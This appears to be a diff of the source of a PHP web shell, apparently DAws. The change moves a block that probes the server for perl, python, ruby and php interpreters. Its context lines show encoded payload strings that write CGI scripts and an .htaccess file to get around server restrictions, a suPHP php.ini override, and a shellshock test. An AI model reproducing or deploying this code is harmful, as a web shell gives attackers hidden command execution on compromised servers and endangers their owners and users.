@@ -508,30 +508,6 @@ suPHP_ConfigPath ".$_SESSION["daws_directory"]."/php.ini
 	}
 }
 
-//finds the location of ruby/perl/python for Windows
-if (!isset($_SESSION["python"]))
-{
-	$softwares = array("perl", "python", "ruby", "php");
-
-	if ($_SESSION["windows"] == True) //will work on this one later
-	{
-	}
-	else
-	{
-		foreach ($softwares as $software)
-		{
-			if (execute_command($software, True))
-			{
-				$_SESSION[$software] = $software;
-			}
-			else
-			{
-				$_SESSION[$software] = null;
-			}
-		}
-	}
-}
-
 function write_to_file($location, $string)
 {
 	$output = file_put_contents_extended($location, $string); //file_put_contents
@@ -672,7 +648,7 @@ function url_get_contents($url, $user_agent=null) //used to download the source 
 }
 
 if (!isset($_SESSION["cgi"])) //setting up the cgi scripts
-{
+{	
 	$cgi_htaccess = "bi4QBzgRCA0AABZPFwQZXRUKHgwUG1RNAxhGRw4EEGU7EwQZCQcfRU8qDAYTMyEgZg==";
 	$cgi_bash = "R05bARkeSQsNFgxlfgYTGAlJTiYLAQAGHgRLHRUVAVVUFxUIEkYEEQkDVmkVEw4GTEdGZX4AHx0LCAIBWQ8RABgfRktINDEqJjovIzI7JSsjTVQfUAMDDUxICk9TEF8uSEMPCgkCFQ0UTTpBNztCMl4/WV5MTUM5VUAERFAMRgsNFgFZQENdXQIMDwoAClQfUAMDDUxHF0BRUUBfRkYLR0QTVBAVFEZLH0pPQFRMF1IGYwkTBQNURxMfCwQNCwA=";
 	$cgi_bat = "JAoXCx9QCQ8Kb24KFwsfUCUGAhEBAQBOBAkWDFZFEAoMF18YEgQAbwEMHAxeemwACkUBFx0QBFACDA8KAApaFwgERg0JCUQLEQAfFANHGB0QZVwGExgJSUk0MSomOi8jMjslKyNVCltVWUZXTAAKDBsHFRRIHRQRbgwREQQFEgAARUkLEQAfFANJTgAKDBsHFRRIHRQRRk9WBxUTCQ0JSxAXAEF6AwMdQxVEDBkHTUwCDA8KAApaFwgEbEwPCABK";
@@ -803,6 +779,30 @@ if (!isset($_SESSION["shsh2"])) //testing shellshock2
 	else
 	{
 		$_SESSION["shsh2"] = False;
+	}
+}
+
+//finds the location of ruby/perl/python for Windows
+if (!isset($_SESSION["python"]))
+{
+	$softwares = array("perl", "python", "ruby", "php");
+
+	if ($_SESSION["windows"] == True) //will work on this one later
+	{
+	}
+	else
+	{
+		foreach ($softwares as $software)
+		{
+			if (execute_command($software, True))
+			{
+				$_SESSION[$software] = $software;
+			}
+			else
+			{
+				$_SESSION[$software] = null;
+			}
+		}
 	}
 }
 
